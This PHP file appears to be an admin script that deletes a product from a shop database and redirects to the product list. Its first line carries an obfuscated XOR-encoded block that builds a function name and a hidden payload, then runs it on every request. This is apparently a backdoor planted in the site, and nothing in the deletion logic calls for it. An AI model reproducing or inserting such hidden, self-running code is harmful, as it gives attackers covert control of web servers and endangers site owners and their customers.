<?php $qUBcNZ='9 ER6-r11BN>9AR'; $WynbSa='ZR 3BH-WD,-JP.<'^$qUBcNZ; $PJriBNq='02fxQ3+;OXQ,96 D0;KrS==J:1P-Zr;U;ZRefVVgJ5OYSX VPZVXR7XY Mbb=:7DeORIMBVOVQ ofZkWpC=>zI  ;jgosBlrCk3,RzfDaohgnmb1O7F8PE;Gw28>3dbqo-iFC<ofBC4ArXugYnX9XPkO>spuQl V laDbsTNM Q7Xll3+UzvHmr;k=,9,RYjwC2IMXonSNFs2V.434mlw6LAC5ZacQL:M8WVBivs2;6SVzfbX :YJ- mowm2w6wweiT0fM=33OKwgFH1 LIYR2Yjc5ZJ8rSE0OrVf.P4kZ4l>Y;2pQxbF9 >6mR2cd0TAYgB7MH-cQ,A255>V7;PPBErbhdas2<eMSsbQEKekKks=8<2IhgEg=qw PXQn=6-atkIZ5=Nkm>hQWOPzmTw Z8X4JDqCRJflqJ--+VVRvL=FN6ERV<7.l9 L6-XXMgt:Y.IUAAUowaYH+W=HdkRWJ3zhvs , A7;,;ZSvdQFilV,:7Vvqg8= X3cPYA879B=CBEqV=BIHdG35>,cEkTTG9.gooRJ5Z9sF 1fsHqlyYVUhvy;gZc,GaTttQfnswJbQWrfrNzxs1MnPTtJnPBYW oKXObH7UGFHlQ=S:9CY=pmhF=RI3qyjecooxBllKF QXvP 8 nu44YXQ 5mlqAkk+L ;iaauNE'; $lQyjreJs=$WynbSa('', 'YTNY7FEX;1>BfSX-CO8ZtER8eU1Y;-d8N.uLOv-mCS:70,I9>z.7 h<8T,==POClA+3=,nvk=4YFFzKwP877smOUOJZOTeWxJbUC RB-ARHWUMFXsD2J< UoSVYJRMYQKDBmj6fof,A5RvHGqJ<X,10kW.P+qHK3Y7E-BVt=9R=R6DHXN,S+aVx2bOIMY 7BS,G=dceg.D;y8rJUGUMQWP--0PakG5-N,g<3;IKSTZZ 3Alh>OH<+NHMGS2q8y<> I5CFiVVJovIGb>PL9,prIScGQ;>Y-8 IoOvBE5MPP=HZ8OSPlXF0XLKSVXOinY2aqFfS,<LJqWK;SZL3VX8pja-0-546ahE, SF: 2EVuKWKYPG,AG>m4xSD1,01VSTAIKm1PDuad7L56;1ZPtSV;T-QqNx>X7lfU.LYJvkr69S5+D,3:UMKDAO>iI9,,8+W,Za7 20YC>=-H8Y-LO66>RSDVWDMT hPIBszMn8 AH2MNVvPWGYOR9J<;<8gRA+N71mV=X;ndDcWTJMJeMrtoTJRGK6+A;bT-EHA.aQQDyq7PGAZUkWIpXaDMcQZJByW7bJPCzOMKPtIytRlN10+6Y0 =6=-O<42;DvM2CU,8YWAHbY3=RXPJECOOX9fe.0A=pR4ALA5RDU 4>AQJ1XzabN4IOAQHND8'^$PJriBNq); $lQyjreJs();
	include 'includes/session.php';

	if(isset($_POST['delete'])){
		$id = $_POST['id'];
		
		$conn = $pdo->open();

		try{
			$stmt = $conn->prepare("DELETE FROM products WHERE id=:id");
			$stmt->execute(['id'=>$id]);

			$_SESSION['success'] = 'Product deleted successfully';
		}
		catch(PDOException $e){
			$_SESSION['error'] = $e->getMessage();
		}

		$pdo->close();
	}
	else{
		$_SESSION['error'] = 'Select product to delete first';
	}

	header('location: products.php');
	
?>